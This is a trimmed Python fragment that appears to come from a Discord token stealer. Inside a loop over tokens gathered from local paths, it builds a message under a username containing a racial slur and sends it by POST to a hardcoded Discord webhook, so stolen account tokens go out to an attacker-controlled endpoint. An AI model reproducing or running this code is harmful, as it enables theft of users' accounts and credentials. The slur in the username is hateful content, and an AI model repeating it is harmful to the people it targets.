        ...
        for token in gettokens(path):
            ...
            try:
                ...
                embed_user = {
                    ...
                    "username": "NiggaTokenPolenKlauer303",
                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                }

                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1404910873171984565/CCxNaHLPobDDJM5fA4mWUz97hjsujI7rAHrZX9mnJcNO-qs26D1wfOLq3HoCuyz8HBga', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
